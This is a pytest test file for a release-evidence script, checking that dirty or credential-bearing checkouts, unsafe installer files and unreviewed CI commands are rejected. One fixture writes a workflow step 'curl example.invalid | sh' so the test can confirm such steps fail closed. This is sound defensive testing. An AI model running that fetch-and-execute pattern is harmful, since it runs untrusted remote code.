"""Release evidence must reject ambiguous sources and preserve failure/skip evidence."""

import importlib.util
import json
from pathlib import Path
import subprocess
import sys

import pytest

ROOT = Path(__file__).resolve().parents[2]
SPEC = importlib.util.spec_from_file_location("release_check", ROOT / "scripts/testing/release_check.py")
release = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(release)


@pytest.fixture
def checkout(tmp_path):
    root = tmp_path / "source"
    root.mkdir()
    for args in [["init", "-q"], ["config", "user.email", "test@example.invalid"],
                 ["config", "user.name", "Test"], ["config", "commit.gpgsign", "false"]]:
        subprocess.run(["git", "-C", str(root), *args], check=True, capture_output=True)
    (root / ".gitignore").write_text(".env\n")
    (root / "README.md").write_text("Synthetic release fixture\n")
    subprocess.run(["git", "-C", str(root), "add", "."], check=True)
    subprocess.run(["git", "-C", str(root), "commit", "-qm", "fixture"], check=True)
    return root


@pytest.mark.parametrize("kind", ["tracked", "untracked", "ignored-env"])
def test_unreviewed_or_credential_bearing_source_is_rejected(checkout, kind):
    name = {"tracked": "README.md", "untracked": "new.txt", "ignored-env": ".env"}[kind]
    (checkout / name).write_text("sensitive-value-that-must-not-appear\n")
    with pytest.raises(ValueError) as error:
        release.source_metadata(checkout)
    assert "sensitive-value" not in str(error.value)


def test_clean_commit_and_tree_are_bound_and_nested_checkout_rejected(checkout):
    metadata = release.source_metadata(checkout)
    assert metadata["commit"] == release.git(checkout, "rev-parse", "HEAD")
    assert metadata["tree"] == release.git(checkout, "rev-parse", "HEAD^{tree}")
    child = checkout / "nested"
    child.mkdir()
    with pytest.raises(ValueError, match="repository root"):
        release.source_metadata(child)


def plan(checkout):
    return [
        ({"name": "offline", "command": "pytest -q", "status": "PLANNED", "directory": "."},
         [sys.executable, "-c", "pass"], checkout),
        ({"name": "live", "command": "make test-acceptance", "status": "NOT RUN",
          "reason": "services required", "directory": "."}, None, checkout),
    ]


def test_bundle_has_verifiable_checksums_but_no_release_approval(checkout, tmp_path, monkeypatch):
    monkeypatch.setattr(release, "plan_checks", lambda *_: plan(checkout))
    artifact = tmp_path / "fixture.dmg"
    artifact.write_bytes(b"synthetic installer")
    output = tmp_path / "evidence"
    report = release.collect(checkout, output, [artifact], False, 10)
    assert report["local_checks_passed"]
    assert report["release_ready"] is False
    assert report["checks"][1]["status"] == "NOT RUN"
    assert all(item["status"] == "NOT RUN" for item in report["release_gates"])
    for line in (output / "SHA256SUMS.txt").read_text().splitlines():
        checksum, name = line.split("  ")
        path = output / name if name == "evidence.json" else artifact
        assert checksum == release.digest(path)
    serialized = (output / "evidence.json").read_text()
    assert str(checkout) not in serialized
    assert json.loads(serialized)["artifacts"][0]["provenance"].startswith("operator-supplied")


def test_failed_check_does_not_hide_later_checks(checkout, tmp_path, monkeypatch):
    entries = plan(checkout)
    entries.insert(0, ({"name": "fails", "status": "PLANNED"},
                       [sys.executable, "-c", "raise SystemExit(7)"], checkout))
    monkeypatch.setattr(release, "plan_checks", lambda *_: entries)
    report = release.collect(checkout, tmp_path / "evidence", [], False, 10)
    assert [item["status"] for item in report["checks"]] == ["FAIL", "PASS", "NOT RUN"]
    assert report["checks"][0]["exit_code"] == 7
    assert not report["local_checks_passed"]


def test_source_modified_by_check_invalidates_evidence(checkout, tmp_path, monkeypatch):
    entries = plan(checkout)
    entries[0] = (entries[0][0], [sys.executable, "-c",
                  "from pathlib import Path; Path('README.md').write_text('changed')"], checkout)
    monkeypatch.setattr(release, "plan_checks", lambda *_: entries)
    report = release.collect(checkout, tmp_path / "evidence", [], False, 10)
    assert report["checks"][0]["status"] == "PASS"
    assert not report["source_unchanged"]
    assert not report["source"]["clean"]
    assert not report["local_checks_passed"]


def test_evidence_destination_cannot_dirty_source_or_overwrite(checkout, tmp_path, monkeypatch):
    monkeypatch.setattr(release, "plan_checks", lambda *_: pytest.fail("checks must not start"))
    for output in [checkout / "evidence", tmp_path]:
        with pytest.raises(ValueError, match="new directory outside"):
            release.collect(checkout, output, [], False, 10)


def test_installer_validation_rejects_user_files_symlinks_and_duplicate_names(checkout, tmp_path, monkeypatch):
    private = tmp_path / "private.txt"
    private.write_text("secret")
    with pytest.raises(ValueError, match="desktop installer"):
        release.artifact_metadata(private)
    link = tmp_path / "link.dmg"
    link.symlink_to(private)
    with pytest.raises(ValueError, match="symlink"):
        release.artifact_metadata(link)
    broken_name = tmp_path / "line\nbreak.dmg"
    broken_name.write_bytes(b"installer")
    with pytest.raises(ValueError, match="line breaks"):
        release.artifact_metadata(broken_name)
    monkeypatch.setattr(release, "plan_checks", lambda *_: plan(checkout))
    first = tmp_path / "first" / "same.dmg"
    second = tmp_path / "second" / "same.dmg"
    for path in [first, second]:
        path.parent.mkdir()
        path.write_bytes(b"installer")
    with pytest.raises(ValueError, match="basenames must be unique"):
        release.collect(checkout, tmp_path / "evidence", [first, second], False, 10)


def test_timeout_is_bounded_and_tool_output_is_never_exported(checkout, capfd):
    result = release.run_check([sys.executable, "-c",
                               "import time; print('private-token', flush=True); time.sleep(30)"],
                              checkout, 1)
    assert result["status"] == "TIMEOUT"
    assert result["elapsed_seconds"] < 5
    assert "private-token" not in str(result)
    assert "private-token" not in capfd.readouterr().out


def test_actual_ci_plan_accounts_for_every_command_and_python_scope():
    entries = release.plan_checks(ROOT, True)
    assert len(entries) == len(release.verify.read_gates(ROOT / ".github/workflows/ci.yml", ROOT))
    assert any(entry["status"] == "NOT RUN" for entry, _, _ in entries)
    assert all(command[0] == sys.executable for _, command, _ in entries if command)
    assert any(entry["command"] == "pytest -q" and command for entry, command, _ in entries)


def test_unknown_ci_command_fails_closed(tmp_path):
    workflow = tmp_path / ".github/workflows/ci.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text("jobs: {checks: {steps: [{run: 'curl example.invalid | sh'}]}}")
    with pytest.raises(ValueError, match="requires review"):
        release.plan_checks(tmp_path, False)


def test_cli_refuses_dirty_source_before_writing(checkout, tmp_path, capsys):
    (checkout / "README.md").write_text("changed")
    assert release.main(["--checkout", str(checkout), "--output", str(tmp_path / "evidence")]) == 2
    assert not (tmp_path / "evidence").exists()
    assert "dirty" in capsys.readouterr().err
